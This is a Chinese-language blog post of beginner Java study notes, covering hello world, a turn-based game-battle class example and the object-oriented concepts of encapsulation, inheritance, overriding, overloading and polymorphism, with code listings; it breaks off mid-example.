title="helloworld"></a>helloworld</h4><ol><li>首先定义一个类，class类名，在类定义后加上一对大括号一{}</li><li>在大括号中间添加一个主(main)方法/函数一public static void main(String [] args){ }  这个主函数是所有java函数的入口函数，是被JVM识别的函数</li><li>在主方法的大括号中间添加一行输出语句一System.out.printIn(“hello world”);</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Sys tem. out.println(<span class="string">&quot;hello world&quot;</span>) ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210606110016813.png" alt="image-20210606110016813"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac .java文件  编译成字节码文件.class</span><br><span class="line">java 类名   执行</span><br></pre></td></tr></table></figure><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210606102920348.png" alt="image-20210606102920348"></p><h3 id="eg1-使用intelliJ-IDEA编写一个游戏类"><a href="#eg1-使用intelliJ-IDEA编写一个游戏类" class="headerlink" title="eg1. 使用intelliJ IDEA编写一个游戏类"></a>eg1. 使用intelliJ IDEA编写一个游戏类</h3><p>IDEA用的JetBrains公司的产品，和python的IDEA同理，使用自动回返试用30天插件实现永久使用的效果</p><p>java是面向对象语言，以开发一个游戏为例，可以将游戏中每一个单元都看成一个个体（角色，地图，场景，装备……），每个个体都可以用类（class）表示封装（封装行为和属性）。</p><p>eg：模拟两个游戏角色回合制pk的场景</p><p><strong>step1：</strong>新建项目，建包</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210607205802924.png" alt="image-20210607205802924"></p><p><strong>step2：</strong>游戏角色类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> game;</span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏角色类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GameCharacter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//角色名称</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="comment">//角色职业</span></span><br><span class="line">    String job;</span><br><span class="line">    <span class="comment">//角色技能</span></span><br><span class="line">    String skill;</span><br><span class="line">    <span class="comment">//角色血量</span></span><br><span class="line">    <span class="keyword">double</span> blood;</span><br><span class="line">    <span class="comment">//角色攻击力</span></span><br><span class="line">    <span class="keyword">double</span> ATK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>step3：</strong>游戏场景类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> game;</span><br><span class="line"></span><br><span class="line"><span class="comment">//场景类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WinAndLose</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *回合制pk方法*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getWin</span><span class="params">(GameCharacter gameCharacter1,GameCharacter gameCharacter2)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="comment">//声明一个方法</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//模拟死循环</span></span><br><span class="line">            <span class="comment">//释放技能，扣除血量</span></span><br><span class="line">            gameCharacter2.blood=gameCharacter2.blood-gameCharacter1.ATK;</span><br><span class="line">            System.out.println(gameCharacter1.name+<span class="string">&quot;使用了&quot;</span>+gameCharacter1.skill+<span class="string">&quot;对&quot;</span>+gameCharacter2.name+<span class="string">&quot;造成了&quot;</span>+gameCharacter1.ATK+<span class="string">&quot;点伤害&quot;</span>);</span><br><span class="line">            System.out.println(gameCharacter2.name+<span class="string">&quot;剩余的血量为&quot;</span>+gameCharacter2.blood);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;   <span class="comment">//模拟睡眠</span></span><br><span class="line">                Thread.sleep(<span class="number">2500</span>); <span class="comment">//用到多线程知识 点sleep后双引号自动出现millis</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            gameCharacter1.blood=gameCharacter1.blood-gameCharacter2.ATK;</span><br><span class="line">            System.out.println(gameCharacter2.name+<span class="string">&quot;使用了&quot;</span>+gameCharacter2.skill+<span class="string">&quot;对&quot;</span>+gameCharacter1.name+<span class="string">&quot;造成了&quot;</span>+gameCharacter2.ATK+<span class="string">&quot;点伤害&quot;</span>);</span><br><span class="line">            System.out.println(gameCharacter1.name+<span class="string">&quot;剩余的血量为&quot;</span>+gameCharacter1.blood);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;   <span class="comment">//模拟睡眠</span></span><br><span class="line">                Thread.sleep(<span class="number">2500</span>); <span class="comment">//用到多线程知识 点sleep后双引号自动出现millis</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//跳出循环条件</span></span><br><span class="line">             <span class="keyword">if</span> (gameCharacter1.blood&lt;=<span class="number">0</span>||gameCharacter2.blood&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (gameCharacter1.blood&gt;gameCharacter2.blood)&#123;</span><br><span class="line">            System.out.println(gameCharacter1.name+<span class="string">&quot;获胜！！！&quot;</span>);  <span class="comment">//字符串拼接，这里与js，python语言相似</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(gameCharacter2.name+<span class="string">&quot;获胜！！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step4：</strong>在主函数中调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> game;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GameTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//在主函数中创建角色对象</span></span><br><span class="line">        GameCharacter gameCharacter1 = <span class="keyword">new</span> GameCharacter();</span><br><span class="line">        <span class="comment">//属于一个角色对象</span></span><br><span class="line">        gameCharacter1.name=<span class="string">&quot;琪亚娜&quot;</span>;</span><br><span class="line">        gameCharacter1.blood=<span class="number">10000</span>;</span><br><span class="line">        gameCharacter1.ATK=<span class="number">500</span>;</span><br><span class="line">        gameCharacter1.job=<span class="string">&quot;风者&quot;</span>;</span><br><span class="line">        gameCharacter1.skill=<span class="string">&quot;羞羞铁拳&quot;</span>;</span><br><span class="line"></span><br><span class="line">        GameCharacter gameCharacter2 = <span class="keyword">new</span> GameCharacter();</span><br><span class="line">        <span class="comment">//创建对手角色对象</span></span><br><span class="line">        gameCharacter2.name=<span class="string">&quot;小怪兽&quot;</span>;</span><br><span class="line">        gameCharacter2.blood=<span class="number">10000</span>;</span><br><span class="line">        gameCharacter2.ATK=<span class="number">200</span>;</span><br><span class="line">        gameCharacter2.job=<span class="string">&quot;饮食者&quot;</span>;</span><br><span class="line">        gameCharacter2.skill=<span class="string">&quot;河东狮吼&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建场景对象</span></span><br><span class="line">        WinAndLose winAndLose = <span class="keyword">new</span> WinAndLose();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用回合制pk的方法</span></span><br><span class="line">        winAndLose.getWin(gameCharacter1, gameCharacter2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step5：</strong>run</p><h2 id="day2-java对象特性：封装-继承-重写（覆盖）重载-多态"><a href="#day2-java对象特性：封装-继承-重写（覆盖）重载-多态" class="headerlink" title="day2 java对象特性：封装 继承 重写（覆盖）重载 多态"></a>day2 java对象特性：封装 继承 重写（覆盖）重载 多态</h2><h3 id="面向对象思想"><a href="#面向对象思想" class="headerlink" title="面向对象思想"></a>面向对象思想</h3><p>当需求单一，或者简单时，我们一步一步去操作没问题，并且效率也挺高。可随着需求的更改，功能的增多，发现需要面对每一个步骤很麻烦了，这时就开始思索，能不能把这些步骤和功能在进行封装，封装时根据不同的功能，进行不同的封装，功能类似的封装在一起。 这样结构就清晰了很多。用的时候，找到对应的类就可以了。这就是面向对象的思想。</p><blockquote><p>C语言是面向过程语言POP（procedure  oriented programming）但其实通过其指针和struct也可以实现面向对象的程序，C++说是面向对象OOP（object oriented programming）的话，就不太适合了，准确来说，C++目前至少是4种<strong>编程范式</strong>的集合体，面向过程，面向对象，元编程和泛型编程，函数式编程。</p><p>关于不同编程范式的形成原因：设计模式的不同，感觉对应着需求，根据需求来构思用哪种模式会比较方便。</p><blockquote><p>关于范式（paradigm）：Paradigm (范式)是一个领域中主流的行事套路， 它包括philosophy (理念)和methods (方法)两部分。Philosophy (理念)这个概念很好理解。比如，购物理念就是什么该买，什么不该买，怎么买。环保理念就是什么还保护，什么不该保护，以及怎么保护。时尚理念就是什么是时尚，什么不是，如何时尚。同理，穿衣理念就是什么该穿，什么不该穿，怎么穿。那么，事的philosophy(理念)就是，做某事,什么该做，什么不该做，以及方式。理念说完了就是methods (方法)。Methods (方法)就是继方式之后的具体的操作。举个例子:屠宰行业的杀猪的paradigm (范式)是3岁以上的杀(什么该做)，3岁以下的不杀(什么不该做)，用电击的方法杀(方式)。具体该如何操作(方法。In sum, paradigm (范式) = philosophy (理念) + methods (方法=主流认为什么事<br>该做+式+方法。</p><p>关于编程范式参考：什么是编程范式 - yqj2065的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/282291911">https://zhuanlan.zhihu.com/p/282291911</a></p></blockquote><p>参考链接：怎么理解 C 语言是面向过程的语言，C++ 是面向对象的语言？ - 皮皮关的回答 - 知乎 <a href="https://www.zhihu.com/question/24425316/answer/1698735362">https://www.zhihu.com/question/24425316/answer/1698735362</a></p></blockquote><ul><li><p><input disabled="" type="checkbox">  任务：通过C++ primer plus的学习进阶C++</p></li><li><p>对象是类的具体化，java语言的基本单元就是类</p></li></ul><h3 id="JVM内存模型"><a href="#JVM内存模型" class="headerlink" title="JVM内存模型"></a>JVM内存模型</h3><p>简单了解如下：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210607195938537.png" alt="image-20210607195938537"></p><p>详细了解参考：这一次，我终于弄清楚了JVM 内存结构 - 不穿格子衫的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/90252450">https://zhuanlan.zhihu.com/p/90252450</a></p><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>比如id_card这种比较隐私数据，为了防止被外界直接获取，可以使用private来阻止直接获取到数据，但是为了方便获取数据，将数据<strong>封装</strong>在get中，对外部提供一个接口的操作就叫封装。</p><h3 id="eg2-一个封装的例子"><a href="#eg2-一个封装的例子" class="headerlink" title="eg2. 一个封装的例子"></a>eg2. 一个封装的例子</h3><p><strong>step1：</strong> 在main方法中<strong>创建</strong>，<strong>指挥</strong>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xiaoyao.proj.student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javademo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        student stu = <span class="keyword">new</span> student();</span><br><span class="line">        stu.name=<span class="string">&quot;逍遥&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">22</span>;</span><br><span class="line">        stu.sex=<span class="string">&quot;男&quot;</span>;</span><br><span class="line"><span class="comment">//        stu.address=&quot;云外天&quot;;</span></span><br><span class="line"><span class="comment">//        stu.ID_card=&quot;123456&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用set给私有变量赋值</span></span><br><span class="line">        stu.setID_card(<span class="string">&quot;987654&quot;</span>);</span><br><span class="line">        <span class="comment">//获取身份证号的get方法</span></span><br><span class="line">        String id= stu.getID_card();</span><br><span class="line"></span><br><span class="line">        System.out.println(id);</span><br><span class="line">        System.out.println(stu);</span><br><span class="line">        <span class="comment">//com.xiaoyao.proj.student@4554617c 如果在student中不使用tostring，会直接返回对象JVM的内存地址</span></span><br><span class="line"></span><br><span class="line">        student stu2=<span class="keyword">new</span> student();</span><br><span class="line">        System.out.println(stu2);</span><br><span class="line">        stu2.getStudy(<span class="string">&quot;hhh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        student stu3=<span class="keyword">new</span> student(<span class="string">&quot;liloker&quot;</span>); <span class="comment">//由于构造方法可以有name参数，所以这里当输入字符串时IDEA好像会自动弹出name</span></span><br><span class="line">        System.out.println(stu3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step2：</strong> main方法中用到的类，数据与方法的封装，get与set，构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.proj;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 学生的属性和行为</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String sex;</span><br><span class="line">    <span class="keyword">private</span> String address=<span class="string">&quot;空中楼阁&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String ID_card=<span class="string">&quot;123456789&quot;</span>;<span class="comment">//IDEA中这里调用之后变量才变色</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//对于私有变量进行封装使用get接口提供身份证号</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getID_card</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ID_card;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;    <span class="comment">//使用alt+insert可以一键召唤get，set等</span></span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//set方法，对私有变量重新进行赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setID_card</span><span class="params">(String ID_card)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.ID_card=ID_card;</span><br><span class="line">        <span class="comment">//这里使用this来指向类中的ID_card</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造方法：类似C++中的构造函数，每个类有一个默认的构造方法，构造方法的方法名称和类名一样</span></span><br><span class="line">    <span class="comment">//无参构造</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">student</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//这里其实是构造方法的重载</span></span><br><span class="line">    <span class="comment">//有参构造</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">student</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果不把无参构造注释掉，那么这里会呈现类似C++中多态的特性，即可以直接new student(),或者可以在里面传入参数,</span></span><br><span class="line">    <span class="comment">//如果把无参构造方法注释掉，那么必须传入参数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//study 方法(函数)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getStudy</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;正在学习&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用toString可以直接调出这段</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, sex=&#x27;&quot;</span> + sex + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, address=&#x27;&quot;</span> + address + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="eg3-一个继承示例"><a href="#eg3-一个继承示例" class="headerlink" title="eg3.一个继承示例"></a>eg3.一个继承示例</h4><p><strong>step1：</strong>创建父类B</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;B类中的fun方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>step2：</strong>创建子类A</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line"><span class="comment">//A类继承B类，A是子类，继承B中的属性和方法，java中不允许多继承，只可以单继承</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>step3：</strong>主函数中调用A类对象a中从B类继承的fun方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javademo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        A a = <span class="keyword">new</span> A();</span><br><span class="line">        a.fun();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="重写（覆盖）"><a href="#重写（覆盖）" class="headerlink" title="重写（覆盖）"></a>重写（覆盖）</h4><p>当子类继承了父类之后，如果父类的方法不满足子类的需求，比如“动物进食”为父类，子类的需求确实“猫吃鱼，鸟吃虫”这样的具体实例，这时就需要在子类中对父类的“动物进食”这个方法进行<strong>重写</strong>，以满足子类需求；</p><h4 id="eg4-一个重写示例"><a href="#eg4-一个重写示例" class="headerlink" title="eg4.一个重写示例"></a>eg4.一个重写示例</h4><p><strong>step1：</strong>创建父类animal</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.proj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;动物的进食行为&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>step2：</strong>创建子类cat，重写吃的行为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.proj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cat</span> <span class="keyword">extends</span> <span class="title">animal</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//        super.eat(); //此处是调用父类的逻辑，如果需要重写，需要将此去除</span></span><br><span class="line">        System.out.println(<span class="string">&quot;猫会吃鱼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step3：</strong>主函数中调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xiaoyao.proj.animal;</span><br><span class="line"><span class="keyword">import</span> com.xiaoyao.proj.cat;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cat重写animal的eat方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javademo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        animal animal = <span class="keyword">new</span> animal();</span><br><span class="line">        cat cat = <span class="keyword">new</span> cat();</span><br><span class="line">        animal.eat();</span><br><span class="line">        cat.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h4><p>在一个类中，方法名称相同，但是参数列表不同，比如eg的学生类中的构造方法，两种构造方法，只是参数列表不同。示例见eg2的student构造方法的重载</p><h3 id="多态（重要）"><a href="#多态（重要）" class="headerlink" title="多态（重要）"></a>多态（重要）</h3><p>满足OCP原则，即开闭原则，不动源代码，不同父类，而是后面再添加新的模块的思想。如果改变父类，可能会产生蝴蝶效应，很麻烦。</p><p>父类的引用指向子类的具体，编译时看父类方法是否完整，运行是看右边，即具体的实例。</p><h3 id="eg5-1-主人喂养宠物案例（使用重载）"><a href="#eg5-1-主人喂养宠物案例（使用重载）" class="headerlink" title="eg5-1. 主人喂养宠物案例（使用重载）"></a>eg5-1. 主人喂养宠物案例（使用重载）</h3><blockquote><p>案例:主人喂养宠物的案例(模拟-个场景)<br>主人类Master feed() 